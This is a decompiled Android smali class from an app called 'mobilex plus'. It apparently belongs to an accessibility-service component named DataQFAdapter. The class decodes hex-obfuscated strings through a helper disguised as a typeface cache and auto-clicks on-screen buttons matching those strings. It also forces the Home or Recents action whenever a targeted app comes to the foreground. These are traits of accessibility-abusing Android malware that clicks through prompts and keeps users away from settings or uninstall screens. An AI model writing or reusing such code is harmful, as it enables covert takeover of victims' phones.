.class public final Lv/s/jpTJdQ79mlaJtReLZ1F;
.super Lv/s/LGm23hksIOxB;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"

# interfaces
.implements Lv/s/JRdueaGIH5g8DVCPba;


# instance fields
.field public final synthetic Ee8d2j4S9Vm5yGuR:Ljava/lang/String;

.field public final synthetic JXn4Qf7zpnLjP5:Lapp/mobilex/plus/services/DataQFAdapter;

.field public final synthetic vekpFI4d1Nc4fakF:I


# direct methods
.method public synthetic constructor <init>(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;I)V
    .locals 0

    .line 1
    iput p3, p0, Lv/s/jpTJdQ79mlaJtReLZ1F;->vekpFI4d1Nc4fakF:I

    .line 2
    .line 3
    iput-object p1, p0, Lv/s/jpTJdQ79mlaJtReLZ1F;->JXn4Qf7zpnLjP5:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 4
    .line 5
    iput-object p2, p0, Lv/s/jpTJdQ79mlaJtReLZ1F;->Ee8d2j4S9Vm5yGuR:Ljava/lang/String;

    .line 6
    .line 7
    const/4 p1, 0x0

    .line 8
    invoke-direct {p0, p1}, Lv/s/LGm23hksIOxB;-><init>(I)V

    .line 9
    .line 10
    .line 11
    return-void
.end method


# virtual methods
.method public final w9sT1Swbhx3hs()Ljava/lang/Object;
    .locals 9

    .line 1
    iget v0, p0, Lv/s/jpTJdQ79mlaJtReLZ1F;->vekpFI4d1Nc4fakF:I

    .line 2
    .line 3
    packed-switch v0, :pswitch_data_0

    .line 4
    .line 5
    .line 6
    iget-object v0, p0, Lv/s/jpTJdQ79mlaJtReLZ1F;->JXn4Qf7zpnLjP5:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 7
    .line 8
    :try_start_0
    invoke-virtual {v0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 9
    .line 10
    .line 11
    move-result-object v1

    nop
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 12
    if-nez v1, :cond_0

    .line 13
    .line 14
    goto/16 :goto_2

    .line 15
    :cond_0
    :try_start_1
    const-string v2, "002500790049008400F500FF00C100B3002C0066"

    .line 16
    .line 17
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 18
    .line 19
    .line 20
    move-result-object v3

    .line 21
    const-string v2, "047C0456040304DA04D304EB048A04850476042D047704DA04AE00FF048C048604010426040604D904A204E704F0048B"

    .line 22
    .line 23
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 24
    .line 25
    .line 26
    move-result-object v4

    .line 27
    const-string v2, "047D0457047904D704AD04E1048004FF0401045A"

    .line 28
    .line 29
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 30
    .line 31
    .line 32
    move-result-object v5

    .line 33
    const-string v2, "047C0456040304DA04D304EB048A04850476042D047704DA04A00490009204F904020454040B04DA04AE04ED048804F7"

    .line 34
    .line 35
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 36
    .line 37
    .line 38
    move-result-object v6

    .line 39
    const-string v2, "002500790049000000F100AD009200B700220064005A008300F1"

    .line 40
    .line 41
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 42
    .line 43
    .line 44
    move-result-object v7

    .line 45
    const-string v2, "002500790049000000F100AD009200AE002D0062005E009500E200AA00C2002000A00079"

    .line 46
    .line 47
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 48
    .line 49
    .line 50
    move-result-object v8

    .line 51
    filled-new-array/range {v3 .. v8}, [Ljava/lang/String;

    .line 52
    .line 53
    .line 54
    move-result-object v2

    .line 55
    invoke-static {v0, v1, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->access$clickNodeWithText(Lapp/mobilex/plus/services/DataQFAdapter;Landroid/view/accessibility/AccessibilityNodeInfo;[Ljava/lang/String;)Z

    .line 56
    .line 57
    .line 58
    move-result v2

    .line 59
    if-eqz v2, :cond_1

    .line 60
    .line 61
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getTAG$cp()Ljava/lang/String;

    .line 62
    .line 63
    .line 64
    const-string v2, "00180050007400B500D3009A00ED009400170059006B00BA00B0009C00DE00AE0020007D005E008300B0009900DD00B500200073001B00B400E400B000C200E700250079004900C7"

    .line 65
    .line 66
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 67
    .line 68
    .line 69
    iget-object v2, p0, Lv/s/jpTJdQ79mlaJtReLZ1F;->Ee8d2j4S9Vm5yGuR:Ljava/lang/String;

    .line 70
    .line 71
    new-instance v3, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 72
    .line 73
    const v4, 0x11

    .line 74
    .line 75
    invoke-direct {v3, v0, v2, v4}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;Ljava/lang/String;I)V

    .line 76
    .line 77
    .line 78
    const-wide/16 v4, 0x1f4

    .line 79
    .line 80
    invoke-static {v0, v3, v4, v5}, Lapp/mobilex/plus/services/DataQFAdapter;->access$safePostDelayed(Lapp/mobilex/plus/services/DataQFAdapter;Lv/s/JRdueaGIH5g8DVCPba;J)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 81
    .line 82
    .line 83
    goto/16 :goto_0

    .line 84
    :catchall_0
    move-exception v0

    nop

    nop

    .line 85
    goto :goto_1

    .line 86
    :cond_1
    :goto_0
    :try_start_2
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 87
    .line 88
    .line 89
    goto/16 :goto_2

    .line 90
    :goto_1
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 91
    .line 92
    .line 93
    throw v0
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 94
    :catch_0
    :goto_2
    sget-object v0, Lv/s/Eo0e0FTdv96U7KeCzoB;->dDIMxZXP1V8HdM:Lv/s/Eo0e0FTdv96U7KeCzoB;

    .line 95
    .line 96
    return-object v0

    .line 97
    :pswitch_0
    iget-object v0, p0, Lv/s/jpTJdQ79mlaJtReLZ1F;->JXn4Qf7zpnLjP5:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 98
    .line 99
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getCurrentApp$p(Lapp/mobilex/plus/services/DataQFAdapter;)Ljava/lang/String;

    .line 100
    .line 101
    .line 102
    move-result-object v1

    .line 103
    sget-object v2, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 104
    .line 105
    invoke-virtual {v1, v2}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 106
    .line 107
    .line 108
    move-result-object v1

    nop

    nop

    .line 109
    iget-object v2, p0, Lv/s/jpTJdQ79mlaJtReLZ1F;->Ee8d2j4S9Vm5yGuR:Ljava/lang/String;

    .line 110
    .line 111
    invoke-virtual {v1, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 112
    .line 113
    .line 114
    move-result v1

    .line 115
    if-eqz v1, :cond_2

    .line 116
    .line 117
    const/4 v1, 0x3

    .line 118
    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    .line 119
    .line 120
    .line 121
    new-instance v1, Lv/s/ssJAORu9Srr5Q9qO2sq;

    .line 122
    .line 123
    const/4 v2, 0x7

    .line 124
    invoke-direct {v1, v0, v2}, Lv/s/ssJAORu9Srr5Q9qO2sq;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;I)V

    .line 125
    .line 126
    .line 127
    const-wide/16 v2, 0xc8

    .line 128
    .line 129
    invoke-static {v0, v1, v2, v3}, Lapp/mobilex/plus/services/DataQFAdapter;->access$safePostDelayed(Lapp/mobilex/plus/services/DataQFAdapter;Lv/s/JRdueaGIH5g8DVCPba;J)V

    .line 130
    .line 131
    .line 132
    :cond_2
    sget-object v0, Lv/s/Eo0e0FTdv96U7KeCzoB;->dDIMxZXP1V8HdM:Lv/s/Eo0e0FTdv96U7KeCzoB;

    .line 133
    .line 134
    return-object v0

    .line 135
    :pswitch_1
    iget-object v0, p0, Lv/s/jpTJdQ79mlaJtReLZ1F;->JXn4Qf7zpnLjP5:Lapp/mobilex/plus/services/DataQFAdapter;

    .line 136
    .line 137
    invoke-static {v0}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getCurrentApp$p(Lapp/mobilex/plus/services/DataQFAdapter;)Ljava/lang/String;

    .line 138
    .line 139
    .line 140
    move-result-object v1

    .line 141
    sget-object v2, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 142
    .line 143
    invoke-virtual {v1, v2}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 144
    .line 145
    .line 146
    move-result-object v1

    .line 147
    iget-object v2, p0, Lv/s/jpTJdQ79mlaJtReLZ1F;->Ee8d2j4S9Vm5yGuR:Ljava/lang/String;

    .line 148
    .line 149
    invoke-virtual {v1, v2}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 150
    .line 151
    .line 152
    move-result v1

    .line 153
    if-eqz v1, :cond_3

    .line 154
    .line 155
    const/16 v1, 0x2

    .line 156
    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    .line 157
    .line 158
    .line 159
    :cond_3
    sget-object v0, Lv/s/Eo0e0FTdv96U7KeCzoB;->dDIMxZXP1V8HdM:Lv/s/Eo0e0FTdv96U7KeCzoB;

    .line 160
    .line 161
    return-object v0

    .line 162
    nop

    .line 163
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
